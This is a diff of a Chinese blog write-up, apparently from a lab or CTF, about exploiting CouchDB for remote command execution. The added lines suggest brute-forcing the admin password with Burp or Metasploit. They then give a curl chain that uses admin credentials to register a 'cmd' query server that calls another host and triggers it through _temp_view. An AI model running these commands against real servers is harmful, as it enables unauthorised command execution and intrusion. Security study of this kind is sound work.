@@ -21,7 +21,7 @@ Couchdb默认会在5984端口开放Restful的API接口，如果使用SSL的话�
 使用nmap扫描可发现couchdb的banner信息
 ![couchdb默认端口](https://urahara3389.github.io/img/Couchdb-RCE-nmap.png)
 
->执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破
+>执行命令需要使用admin权限，如果数据库存在未授权则可直接利用，若有账号认证则需要想办法获取admin的密码，当然可通过burpsuit去爆破/_utils/，也可以通过metasploit中的auxiliary/scanner/couchdb/couchdb_login模块直接进行爆破
 
 CouchDB提供了一个可视化界面工具，在浏览器中运行“http://127.0.0.1:5984/_utils/”，即可见到如下所示的界面。
 ![账号认证](https://urahara3389.github.io/img/Couchdb-RCE-admin.png)
@@ -55,6 +55,15 @@ curl -X POST 'http://192.168.199.181:5984/teeest/_temp_view?limit=11' -d '{"lang
 ![执行反弹](https://urahara3389.github.io/img/Couchdb-RCE-backshell.png)
 getshell，读取flag
 ![成功](https://urahara3389.github.io/img/Couchdb-RCE-over.png)
+>同样你也可以不用登录获取Cookie，直接在curl请求中带入账号密码也是可以的，类似于这样，执行效果是一样的，这种方法可能更方便点吧
+```
+root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/_config/query_servers/cmd' -d '"curl http://192.168.199.140/flag"'
+"curl http://192.168.199.140/flag"
+root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa'
+{"ok":true}
+root@Urahara:~# curl -X PUT 'admin:1qaz2wsx@192.168.199.165:5984/wa/haha' -d '{"_id":"770895a97726d5ca6d70a22173005c7a"}'{"ok":true,"id":"haha","rev":"1-967a00dff5e02add41819138abb3284d"}
+root@Urahara:~# curl -X POST 'admin:1qaz2wsx@192.168.199.165:5984/wa/_temp_view?limit=14' -d '{"language":"cmd","map":""}' -H 'Content-Type: application/json'
+```
 
 
 ### 参考
